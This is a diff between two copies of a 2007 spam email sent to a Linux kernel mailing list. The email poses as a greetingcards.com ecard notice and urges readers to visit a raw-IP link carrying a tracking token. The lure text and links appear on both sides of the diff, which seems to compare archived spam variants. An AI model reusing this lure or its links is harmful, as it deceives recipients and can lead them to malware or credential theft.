@@ -1,8 +1,10 @@
-From: "greetingcards.com" <tglzd@adbrite.com>
-Date: Sat, 07 Jul 2007 18:29:44 +0000
+From: "greetingcards.com" <tglzd@adnotam.no>
+Date: Sun, 08 Jul 2007 16:31:48 +0000
 Subject: [KJ] You've received an ecard from a Family member!
-Message-Id: <001701c7c0c4$ca2369f0$81d98763@uoctc.ualw>
+Message-Id: <001701c7c17d$7b136590$81d98763@ck.alw>
 List-Id: <kernel-janitors.vger.kernel.org>
+References: <001701c7c0c4$ca2369f0$81d98763@uoctc.ualw>
+In-Reply-To: <001701c7c0c4$ca2369f0$81d98763@uoctc.ualw>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -16,7 +18,7 @@ SEEING YOUR CARD
 If your email software creates links to Web pages, click on your 
 card's direct www address below while you are connected to the Internet:
 
-http://83.144.68.175/?8911e6c36a4bc955099675c500
+http://24.29.168.126/?8911e6c36a4bc955099675c500
 
 Or copy and paste it into your browser's "Location" box (where Internet 
 addresses go).
